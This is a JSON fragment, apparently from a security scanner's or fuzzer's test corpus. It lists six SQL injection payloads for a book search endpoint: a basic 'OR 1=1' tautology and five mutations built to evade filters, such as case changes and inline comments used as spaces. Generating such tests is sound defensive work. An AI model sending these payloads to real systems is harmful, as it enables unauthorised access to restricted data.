  "sqli:GET /books/search": [
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "sqli: a tautology in the search term may return staff-only books",
      "params": {
        "q": "' OR 1=1 --"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    },
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "mutation of \"' OR 1=1 --\": lowercase OR",
      "params": {
        "q": "' or 1=1 --"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    },
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "mutation of \"' OR 1=1 --\": mixed-case OR",
      "params": {
        "q": "' Or 1=1 --"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    },
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "mutation of \"' OR 1=1 --\": quoted tautology",
      "params": {
        "q": "' or '1'='1' --"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    },
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "mutation of \"' OR 1=1 --\": percent-quote tautology",
      "params": {
        "q": "%' or 1=1 --"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    },
    {
      "endpoint": "GET /books/search",
      "headers": {},
      "json_body": null,
      "method": "GET",
      "note": "mutation of \"' OR 1=1 --\": space as inline comment",
      "params": {
        "q": "'/**/OR/**/1=1/**/--"
      },
      "path": "/books/search",
      "vuln_class": "sqli"
    }
  ],
